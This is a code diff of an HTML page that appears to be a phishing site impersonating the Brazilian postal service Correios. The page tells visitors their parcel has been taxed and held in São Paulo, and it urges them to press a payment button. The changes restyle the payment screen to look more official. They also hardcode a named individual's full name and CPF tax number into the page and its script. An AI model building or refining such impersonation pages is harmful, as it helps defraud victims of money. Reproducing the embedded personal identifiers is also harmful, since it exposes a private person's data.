@@ -328,32 +328,88 @@
       }
     }
     
-    /* Status box */
-    .status-box {
-      background-color: #fff;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      padding: 15px;
+    /* Breadcrumb navigation */
+    .breadcrumb {
+      background-color: #e3f2fd;
+      padding: 8px 15px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    
+    .breadcrumb a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    
+    .breadcrumb a:hover {
+      text-decoration: underline;
+    }
+    
+    .breadcrumb .active {
+      color: #6c757d;
+    }
+    
+    .breadcrumb > li + li:before {
+      content: ">";
+      padding: 0 5px;
+      color: #6c757d;
+    }
+    
+    /* Status alert */
+    .status-alert {
+      display: flex;
+      align-items: center;
+      background-color: #fff3cd;
+      color: #856404;
+      padding: 10px 15px;
+      border-radius: 4px;
       margin: 15px 0;
+      font-weight: bold;
+    }
+    
+    .status-alert:before {
+      content: "•";
+      color: #ffc107;
+      font-size: 24px;
+      margin-right: 10px;
+    }
+    
+    .status-label {
+      color: #003157;
+      font-weight: bold;
+      margin-right: 5px;
+    }
+    
+    /* Warning icon */
+    .warning-icon {
+      color: #dc3545;
+      margin-right: 5px;
+    }
+    
+    /* Info overlay */
+    .info-overlay {
+      background-color: #f8f9fa;
+      border: 1px solid #dee2e6;
+      border-radius: 4px;
+      padding: 15px;
+      margin: 20px 0;
       text-align: left;
     }
     
-    .status-title {
-      font-weight: bold;
-      color: #d9534f;
+    .info-row {
+      display: flex;
+      justify-content: space-between;
       margin-bottom: 10px;
     }
     
-    .status-item {
-      margin-bottom: 5px;
-      padding-left: 15px;
-      position: relative;
+    .info-label {
+      font-weight: bold;
+      color: #003157;
     }
     
-    .status-item:before {
-      content: "•";
-      position: absolute;
-      left: 0;
+    .info-value {
+      color: #212529;
     }
   </style>
 </head>
@@ -432,37 +488,47 @@
 
     <!-- Tela Pagamento -->
     <section id="pagamento">
-      <h1>Portal Correios</h1>
-      <h2>Rastreamento</h2>
+      <ul class="breadcrumb">
+        <li><a href="#">Portal Correios</a></li>
+        <li class="active">Rastreamento</li>
+      </ul>
       
-      <h2 style="color: #d9534f; font-size: 18px;">SUA ENCOMENDA FOI TRIBUTADA!</h2>
-      
-      <div class="status-box">
-        <div class="status-title">STATUS DA ENTREGA:</div>
-        <div class="status-item">AGUARDANDO SUA CONFIRMAÇÃO</div>
+      <div class="status-alert">
+        <span class="status-label">STATUS DA ENTREGA:</span> AGUARDANDO SUA CONFIRMAÇÃO
       </div>
       
-      <p>Sua encomenda está retida na agência dos Correios em São Paulo</p>
+      <h2><span class="warning-icon">❗</span> SUA ENCOMENDA FOI TRIBUTADA!</h2>
       
-      <p>Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
+      <p style="color: #000;">Sua encomenda está retida na agência dos Correios em São Paulo</p>
       
-      <p><span>NOME:</span> Rosiane O Silva</p>
-      <p><span>CPF:</span> 118.273.047-74</p>
-      <p><span>RUA:</span> <span id="pag-rua"></span></p>
-      <p><span>BAIRRO:</span> <span id="pag-bairro"></span></p>
-      <p><span>CIDADE:</span> Porciúncula</p>
+      <p style="color: #000;">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
       
-      <div class="status-box">
-        <div class="status-title">Previsão de Entrega</div>
-        <div class="status-item">3 dias após o pagamento</div>
-        <div class="status-item">Objeto aguardando sua confirmação</div>
-        <div class="status-item">em Unidade de Fiscalização em São Paulo</div>
+      <div class="info-overlay">
+        <div class="info-row">
+          <span class="info-label">NOME:</span>
+          <span class="info-value" id="pag-nome">Rosiane O Silva</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">CPF:</span>
+          <span class="info-value" id="pag-cpf">118.273.047-74</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">CIDADE:</span>
+          <span class="info-value" id="pag-cidade">Porciúncula</span>
+        </div>
       </div>
+      
+      <div class="status-alert">
+        <span class="status-label">Previsão de Entrega:</span> 3 dias após o pagamento
+      </div>
+      
+      <p>Objeto aguardando sua confirmação</p>
+      <p>em Unidade de Fiscalização em São Paulo</p>
       
       <div class="btn-container">
         <button id="btn-pagar">Efetuar Pagamento</button>
-        <div class="status-item">Objeto em transferência - por favor aguarde</div>
-        <div class="status-item">Objeto Postado</div>
+        <p>Objeto em transferência - por favor aguarde</p>
+        <p>Objeto Postado</p>
         <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
       </div>
     </section>
@@ -604,6 +670,11 @@
 
         document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
         document.getElementById("res-estado").textContent = dadosPessoa.estado;
+
+        // Atualiza também os dados na tela de pagamento
+        document.getElementById("pag-nome").textContent = "Rosiane O Silva";
+        document.getElementById("pag-cpf").textContent = "118.273.047-74";
+        document.getElementById("pag-cidade").textContent = dadosPessoa.cidade;
 
         document.getElementById("loading-container").style.display = "none";
         document.getElementById("tela-formulario").style.display = "none";
